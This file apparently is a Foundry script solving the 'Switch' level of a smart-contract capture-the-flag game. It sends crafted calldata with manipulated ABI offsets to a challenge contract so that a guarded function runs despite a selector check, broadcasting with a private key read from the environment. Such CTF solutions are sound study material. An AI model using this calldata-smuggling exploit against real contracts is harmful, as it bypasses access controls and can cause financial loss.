pragma solidity ^0.8.0;
import "../instances/Ilevel29.sol";
import "forge-std/Test.sol";

contract Level29 is Test {
    Switch level29 =
        Switch(payable(0x812eaB1581ea01AB3713cC899bC7897EFE23a17b));

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        bytes
            memory payload = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        address(level29).call(payload);
        require(level29.switchOn() == true, "not solved");
        vm.stopBroadcast();
    }
}
